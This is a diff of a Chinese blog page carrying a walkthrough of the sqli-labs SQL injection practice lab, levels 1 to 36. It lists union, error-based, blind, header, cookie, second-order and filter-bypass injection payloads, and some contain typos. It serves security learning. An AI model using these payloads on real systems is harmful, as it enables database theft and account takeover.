@@ -6,13 +6,16 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2020 | Hello MyBlog</title>
+  <title>sqli-labs 1-36关解析(1) | Hello MyBlog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hello MyBlog">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;archives&#x2F;2020&#x2F;index.html">
+  <meta name="description" content="less1?id=1&amp;apos; and 1=1 --+ ?id=1&amp;apos; and 1=2 --+* 查出存在注入点 输入?id=0&amp;apos; union select 1,database(),3 --+ 即可得到数据库信息 输入？id=0&amp;apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_sce">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs 1-36关解析(1)">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;17&#x2F;sqli-labs%201-36%E5%85%B3%E8%A7%A3%E6%9E%90(1)&#x2F;index.html">
 <meta property="og:site_name" content="Hello MyBlog">
+<meta property="og:description" content="less1?id=1&amp;apos; and 1=1 --+ ?id=1&amp;apos; and 1=2 --+* 查出存在注入点 输入?id=0&amp;apos; union select 1,database(),3 --+ 即可得到数据库信息 输入？id=0&amp;apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_sce">
 <meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2020-02-17T14:37:54.530Z">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Hello MyBlog" type="application/atom+xml">
@@ -149,130 +152,199 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-sqli-labs 1-36关解析(1)" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      sqli-labs 1-36关解析(1)
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/17/sqli-labs%201-36%E5%85%B3%E8%A7%A3%E6%9E%90(1)/" class="archive-article-date">
+
+        
+        <a href="/2020/02/17/sqli-labs%201-36%E5%85%B3%E8%A7%A3%E6%9E%90(1)/" class="archive-article-date">
   	<time datetime="2020-02-17T14:38:16.588Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-17</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/17/sqli-labs%201-36%E5%85%B3%E8%A7%A3%E6%9E%90(1)/">sqli-labs 1-36关解析(1)</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h3><p>?id=1' and 1=1 --+<br>
+?id=1' and 1=2 --+*<br>
+查出存在注入点<br>
+输入?id=0' union select 1,database(),3 --+<br>
+即可得到数据库信息<br>
+输入？id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_scehma=database() --+<br>
+即可得到当前数据库下的各个表名
 
-        <div class="article-info info-on-right">
-          
-          
 
+<h4 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h4><p>与less1 不同的地方在于直接输入数字即可</p>
+<h4 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h4><p>与less1不同的地方在与需要使用’)闭合</p>
+<h4 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h4><p>与less1不同的地方在与需要使用 “)闭合</p>
+<h3 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h3><p>此关为盲注<br><br><em>?id=1’ and 1=1 –+</em><br><br> <em>?id=1’ and 1=2 –+</em><br><br> 发现有注入点<br><br> ?id=1’ and if(ascii(substr(database(),1,1))=97,1,sleep(3)) –+<br><br> 利用brupsuite<br> 抓包并进行intrude，得出数据库为security<br></p>
+<h3 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h3><p> ?id=1” and 1=1 –+<br><br> ?id=1” and 1=2 –+<br><br> 查出有注册点<br><br> ?id=1” union select<br> extractvalue(1,concat(0x7e,(database()),0x7e))–+<br><br> 获取数据库名<br><br> ?id=1” union select<br> extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() ),0x7e)) –+<br><br> 成功获取当前数据库下的表名</p>
+<h3 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h3><p> <em>?id=1’)) and 1=1 –+</em> <br><br> <em>?id=1’)) and 1=2 –+</em> <br><br> 查出有注入点<br><br> ?id=1’)) union select 1,database(),user() into outfile ‘c:/saywhat.txt’ –+<br><br> 成功获取数据库和用户名<br><br> ?id=1’)) union select 1,table_name, 3 from information_schema.tables where table_schema=database() into outfile ‘c:/say4what.txt’  –+<br><br> 成功获取表名</p>
+<h3 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h3><p> ?id=1’ and 1=1 –+<br><br> ?id=1’ and 1=2 –+<br><br> 发现有注入点<br><br> ?id=1’ and if(ascii(substr(database(),1,1))=97,1,sleep(3)) –+<br><br> 利用brupsuite<br> 抓包并进行intrude，得出数据库为security<br></p>
+<h3 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h3><p> ?id=1’ and 1=1 –+<br><br> ?id=1’ and 1=2 –+<br><br> 发现有注入点<br><br> ?id=1’ and if(ascii(substr(database(),1,1))=97,1,sleep(3)) –+<br><br> 利用brupsuite 抓包并进行intrude，得出数据库为security</p>
+<h3 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h3><p> ?id=1” and 1=1 –+<br><br> ?id=1” and 1=2 –+<br><br> 发现有注入点<br><br> ?id=1” and if(ascii(substr(database(),1,1))=97,1,sleep(3)) –+<br><br> 利用brupsuite<br> 抓包并进行intrude，得出数据库为security</p>
+<h3 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h3><p> 11关为post传值，注释符尽量使用#<br><br> 输入admin’ or 1=1 #<br><br> 成功登录<br><br> 通过<br>admin’ order by 2 # <br><br> 判断出<br> 该站点的字段数为2<br><br> 从admin’ union select 1,2 #<br><br> 该站点在1，2位显示<br><br> admin’ union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #<br><br> 成功得出当前数据库的表<br></p>
+<h3 id="less-12"><a href="#less-12" class="headerlink" title="less 12"></a>less 12</h3><p> admin”) or 1=1 #<br><br> 成功登进后台<br><br> admin”) order by 2<br> 显示成功，表名站点字段数为2<br><br> admin”) union select 1，2 #<br><br> 页面并不显示数字，改用报错注入方式<br><br> admin”) union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) #<br><br> 成功得出当前数据库的表名</p>
+<h3 id="less-13"><a href="#less-13" class="headerlink" title="less 13"></a>less 13</h3><p> admin’) or 1=1 #<br><br> 显示成功登录进后台，但却没有登录信息的回显<br><br> admin’) order by 2 # 测试成功<br><br> 页面并不显示数字，改用报错注入方式<br><br> admin’) union select<br> extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) #<br><br> 成功获得当前数据库中的表名<br></p>
+<h3 id="less-14"><a href="#less-14" class="headerlink" title="less 14"></a>less 14</h3><p> admin” or 1=1 # 成功登录进后台<br><br> admin” order by 2 # 测试成功<br><br> admin” union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) #<br><br> 成功获取当前数据库中的表名</p>
+<h3 id="less-15"><a href="#less-15" class="headerlink" title="less 15"></a>less 15</h3><p> admin’ or 1=1 #成功登录进后台<br><br> admin’ order by 2# 测试成功<br><br> admin’ union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) #<br><br> 除了错误的图标之外没有任何的回显，因此应该进行盲注<br><br> admin’ and if(length(database()=1,1,sleep(2))<br> 用brupsuite 抓包，获取到长度为8<br> admin’ and if(ascii(substr((select database()),1,1))=97,1,sleep(2))#<br><br> 用brup suite 抓包，进行intrude,得到数据库名为security<br><br> admin’ and if(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit ==0==,1),==1==,1))=97,sleep(2),1) #<br><br> 用brup suite 进行intrude 得到各个表名</p>
+<h3 id="less-16"><a href="#less-16" class="headerlink" title="less 16"></a>less 16</h3><p> admin”) or 1=1 #成功进入后台<br><br> admin”）order by 2# 测试成功<br><br> admin”） union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) #<br><br> 除了错误的图标之外没有任何的回显，因此应该进行盲注<br><br> admin” and if(length(database()=1,1,sleep(2))<br> 用brupsuite 抓包，获取到长度为8<br> admin” and if(ascii(substr((select database()),1,1))=97,1,sleep(2))#<br><br> 用brup suite 抓包，进行intrude,得到数据库名为security<br><br> admin” and if(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))=97,sleep(2),1) #<br><br> 用brup suite 进行intrude 得到各个表名</p>
+<h3 id="less-17"><a href="#less-17" class="headerlink" title="less 17"></a>less 17</h3><p> user name 为 admin<br><br> new password =12’ or updatexml(1,concat(0x7e,(select database()),0x7e),1) or’<br> 成功获取数据库名称<br><br> new password =12’ or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() ),0x7e),1) or’<br><br> 成功获取当前数据库的表名<br></p>
+<h3 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h3><p> 测试注入点<br>发现’ 被进行转义，无法进行宽字节注入<br><br>只能已admin账号登录进后台，成功登录进后台，且显示user-agent信息，因此应该用brupsuite 抓包进行http头注入<br><br>User-Agent: dsa’ or updatexml(1,concat(0x7e,(select database()),0x7e),1),’’,’’) #<br><br>成功获取数据库名。<br><br>User-Agent:dsa’ or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1),’’,’’)#<br><br>成功获取当前数据库下的表名。<br></p>
+<h3 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h3><p>与less18相同前台没有注册点，用admin登录账户，回显refer信息，因此应该采用http头注入<br><br>Referer: 1’ or updatexml(1,concat(0x7e,database(),0x7e),1) or ‘#<br>成功回显database()信息</p>
+<h3 id="less-20"><a href="#less-20" class="headerlink" title="less 20"></a>less 20</h3><p>在cookie处输入Cookie: uname=admin’发现有注入点<br><br>输入Cookie: uname=admin’ and updatexml(1,concat(0x7e,(select database()),0x7e),1) or ‘<br><br>成功获取数据库名称</p>
+<h3 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h3><p>与less20不同，用brupsuite抓包，cookie并非明文显示，而是url和base64加密后的形式。<br><br>在cookie处输入以base64加密之后的1’即MSc=<br>回显错误信息，存在注入点<br><br>输入1’ or updatexml(1,(concat(0x7e,(select database()),0x7e)),1) or ‘base64加密之后的<br>uname=MScgb3IgdXBkYXRleG1sKDEsKGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSkpLDEpIG9yICc=<br><br>成功获取数据库信息<br></p>
+<h3 id="less22"><a href="#less22" class="headerlink" title="less22"></a>less22</h3><p>在cookie输入<br><br>1” or updatexml(1,(concat(0x7e,(select database()),0x7e)),1) or “<br><br>成功显示数据库名称<br></p>
+<h3 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h3><p>经过测试，发现站点把注释符给过滤掉，因此采用不使用注释符的办法进行尝试绕过<br><br>输入?id=1’ and (select database()),1)) and ‘1’=’1<br><br>发现页面没有任何的回显信息<br><br>尝试使用报错注入的方式<br><br>输入?id=1’ and (updatexml(1,(concat(0x7e,(select database()),0x7e)),1)) and ‘1’=’1<br><br>页面成功显示数据库信息</p>
+<h3 id="less24"><a href="#less24" class="headerlink" title="less24"></a>less24</h3><p>查看源码发现登录界面进行了防注入操作。登录界面很难进行注入，考虑其他模块。<br><br>猜测可以使用二次注入的方式进行注入<br><br>在创建用户的模块，用户名输入admin’#<br><br>由于内部并不会数据库查出来的信息进行过滤，我们可以利用修改密码的功能<br><br>update set password=’’ where username=’’<br><br>用刚才注册的admin’#进行登录<br><br>修改密码为1234返回主页，<br><br>此时admin的密码已被修改为1234<br></p>
+<h3 id="less25"><a href="#less25" class="headerlink" title="less25"></a>less25</h3><p>or 和 and 被过滤掉了<br><br>尝试使用 大小写 aNd 发现失败<br><br>尝试使用内联注释 /<em>！and</em>/ 发现失败<br><br>尝试使用 aandnd 发现成功绕过<br><br>使用?id=1’  aandnd extractvalue(1,concat(0x7e,(select database()),0x7e)) –+<br><br>成功获取数据库信息<br></p>
+<h3 id="less26"><a href="#less26" class="headerlink" title="less26"></a>less26</h3><p>提示我们空格和注释都被过滤，经测试发现and也进行了处理.<br><br>空格的绕过有<br><br>1.用/**/代替 <br><br>2.用括号代替 <br><br>此处我们采用括号代替<br><br>输入?id=1’aandnd(1=1)anandd’1’=’1<br><br>发现成功显示<br><br>输入?id=1’aandnd(1=2)anandd’1’=’1<br><br>发现回显信息消失，表示括号内的语句成功执行<br><br>?id=1’aandnd(extractvalue(1,concat(0x7e,(select(database())),0x7e)))anandd’1’=’1<br><br>成功获取database信息<br></p>
+<h3 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h3><p>将空格，注释符，select，union都进行了过滤<br><br>利用大小写结合Select ，/<em>%a0</em>/成功绕过<br><br>?id=0’/<em>%0a</em>/UnIoN/<em>%0a</em>/SeLeCt/<em>%0a</em>/2,database(),3/<em>%0a</em>/||/<em>%0a</em>/‘1’=’1<br><br>成功获得数据库信息<br></p>
+<h3 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h3><p>在window下%a0 会变为奇怪的字符<br><br>此处，对空格，注释符，select，union都进行了过滤，与less27相比，select和union的过滤更为严格，其中对于空格，%a0,tab键，+，%20都是失效的，采用%0A<br>即换行来代替<br><br>?id=0’)ununion%0Aselection%0Aselect%0A1,database(),3||(‘1’)=(‘1<br><br>成功获得数据库名<br></p>
+<h3 id="less29"><a href="#less29" class="headerlink" title="less29"></a>less29</h3><p>?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() –+<br><br>成功获取当前数据库下的表名<br></p>
+<h3 id="less30"><a href="#less30" class="headerlink" title="less30"></a>less30</h3><p>?id=-1” union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() –+<br><br>成功获取当前数据库下的表名<br></p>
+<p>但less28-less31所考察的内柔是服务器两层架构<br><br>对于php/apache<br>传递?id=1&amp;id=2 <br> id=1会先在tomcat上进行jsp解析。之后id=2会在apache进行解析。一般的过滤设置在tomcat上，因此，对id=2进行注入，就能对参数进行污染。<br></p>
+<h3 id="less32"><a href="#less32" class="headerlink" title="less32"></a>less32</h3><p>经过测试可以知道对’进行了转义，我们尝试采用宽字节注入<br><br>输入?id=1%df’<br><br>发现存在注入点.<br>‘的转义%5c成功与%df结合形成文字<br><br>输入?id=0%df’ union select 1,database(),user() –+<br>成功获取数据库名</p>
+<h3 id="less33"><a href="#less33" class="headerlink" title="less33"></a>less33</h3><p>与less32相同<br>输入?id=0%df’ union select 1,database(),user() –+<br><br>成功获取数据库名称</p>
+<h3 id="less34"><a href="#less34" class="headerlink" title="less34"></a>less34</h3><p>此处宽字节注入失败，可以采用将’ 转化为utf-16或utf-32编码的形式，此处采用’的utf-16的编码形式�’ <br><br>输入�’ or 1=1# <br><br>成功登录<br><br>输入�’ union select 1,database()# <br><br>成功获取数据库信息</p>
+<h3 id="less35"><a href="#less35" class="headerlink" title="less35"></a>less35</h3><p>输入<br>?id=-1 union select 1,database(),3 –+<br>成功获取数据库信息</p>
+<h3 id="less36"><a href="#less36" class="headerlink" title="less36"></a>less36</h3><p>同样利用宽字节注入<br>输入<br><br>?id=0%df’ union select 1,database(),3 –+<br>成功获取数据库信息</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/02/17/sqli-labs%201-36%E5%85%B3%E8%A7%A3%E6%9E%90(1)/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/17/sqlmap%E4%BD%BF%E7%94%A8/" class="archive-article-date">
-  	<time datetime="2020-02-17T14:31:33.930Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-17</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/02/17/sqlmap%E4%BD%BF%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">sqlmap使用</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/17/sqlmap%E4%BD%BF%E7%94%A8/">sqlmap使用</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/17/mysql%20%E6%8B%BFshell%E5%8F%8A%E6%8F%90%E6%9D%83/" class="archive-article-date">
-  	<time datetime="2020-02-17T14:30:36.667Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/17/mysql%20%E6%8B%BFshell%E5%8F%8A%E6%8F%90%E6%9D%83/">mysql 拿shell及提权</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/17/ajax%E7%9A%84%E5%88%A9%E7%94%A8/" class="archive-article-date">
-  	<time datetime="2020-02-17T14:29:35.733Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/17/ajax%E7%9A%84%E5%88%A9%E7%94%A8/">ajax的利用</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -295,8 +367,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
